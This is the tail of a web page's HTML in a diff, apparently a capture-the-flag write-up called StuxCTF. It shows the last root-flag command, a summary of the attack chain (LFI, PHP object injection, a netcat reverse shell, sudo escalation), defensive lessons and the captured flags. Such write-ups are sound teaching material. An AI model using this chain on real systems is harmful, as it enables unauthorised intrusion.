+</span></span><span class="line"><span class="cl"><span class="c1"># Get root flag</span>
+</span></span><span class="line"><span class="cl">cat /root/root.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># Output: 0028454003b42601548df551b738976c</span>
+</span></span></code></pre></div>
+<h2 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>We successfully compromised this machine through:</p>
+<ol>
+<li><strong>Reconnaissance:</strong> Used Nmap to discover open services</li>
+<li><strong>Cryptography:</strong> Solved a Diffie-Hellman challenge to find a hidden directory</li>
+<li><strong>Web Exploitation:</strong> Discovered and exploited an LFI vulnerability</li>
+<li><strong>Object Injection:</strong> Used PHP Object Injection to achieve code execution</li>
+<li><strong>Privilege Escalation:</strong> Leveraged overly permissive sudo configuration</li>
+</ol>
+
+<h2 class="relative group">Key Learning Points 
+    <div id="key-learning-points" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#key-learning-points" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">For Beginners: 
+    <div id="for-beginners" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#for-beginners" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Reconnaissance is crucial:</strong> Always start by mapping out the target&rsquo;s attack surface.</p>
+<p><strong>Read the source:</strong> Web applications often leak information in HTML comments and configuration files.</p>
+<p><strong>Understand the code:</strong> Take time to analyze vulnerable code to understand exactly how exploits work.</p>
+<p><strong>Chain vulnerabilities:</strong> Multiple small vulnerabilities can often be combined for greater impact.</p>
+
+<h3 class="relative group">Security Lessons: 
+    <div id="security-lessons" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#security-lessons" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Never trust user input:</strong> The <code>unserialize()</code> function should never process untrusted data.</p>
+<p><strong>Principle of least privilege:</strong> The <code>www-data</code> user shouldn&rsquo;t have unlimited sudo access.</p>
+<p><strong>Input validation:</strong> All user-supplied data should be properly validated and sanitized.</p>
+<p><strong>Defense in depth:</strong> Multiple security layers can prevent a single vulnerability from compromising the entire system.</p>
+
+<h2 class="relative group">Tools Used 
+    <div id="tools-used" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#tools-used" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li><strong>Nmap:</strong> Network reconnaissance</li>
+<li><strong>curl:</strong> Web requests and response analysis</li>
+<li><strong>Python:</strong> Cryptographic calculations and payload hosting</li>
+<li><strong>PHP:</strong> Creating malicious serialized objects</li>
+<li><strong>Netcat:</strong> Reverse shell listener and connection</li>
+<li><strong>CyberChef:</strong> Data decoding and analysis</li>
+</ul>
+
+<h2 class="relative group">Conclusion 
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>This CTF challenge demonstrates how attackers can chain together multiple techniques to achieve full system compromise. From solving cryptographic puzzles to exploiting web vulnerabilities and escalating privileges, each step builds upon the previous one.</p>
+<p>The key takeaway for defenders is that security is only as strong as the weakest link. Even with cryptographic protections hiding the vulnerable directory, poor input validation and excessive privileges led to complete system compromise.</p>
+<p><strong>Flags Captured:</strong></p>
+<ul>
+<li>User Flag: <code>0b6044b7807dd100b9e30f1bd09db53f</code></li>
+<li>Root Flag: <code>0028454003b42601548df551b738976c</code></li>
+</ul>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/&amp;title=StuxCTF"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=http://localhost:1313/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/&amp;text=StuxCTF"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=http://localhost:1313/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/&amp;resubmit=true&amp;title=StuxCTF"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/&amp;quote=StuxCTF"
+          title="Share on Facebook"
+          aria-label="Share on Facebook">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+</span>
+        </a>
+      
+    
+  </section>
+
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts/2025-08-31-StuxCTF/2025-08-31-StuxCTF.md"
+          data-oid-likes="likes_posts/2025-08-31-StuxCTF/2025-08-31-StuxCTF.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/2025-08-30-ignition/2025-08-30-ignition/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Ignition</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-08-30T01:09:33&#43;03:00">30 August 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/2024-03-19-wifi-hacking-101/2024-03-19-wifi-hacking-101/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >WIFI Hacking 101</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-03-19T00:00:00&#43;00:00">19 March 2024</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          © 2025 HushKat. All rights reserved.
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+    <a rel="me" href="https://masto.ai/@blowfish"></a>
+
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
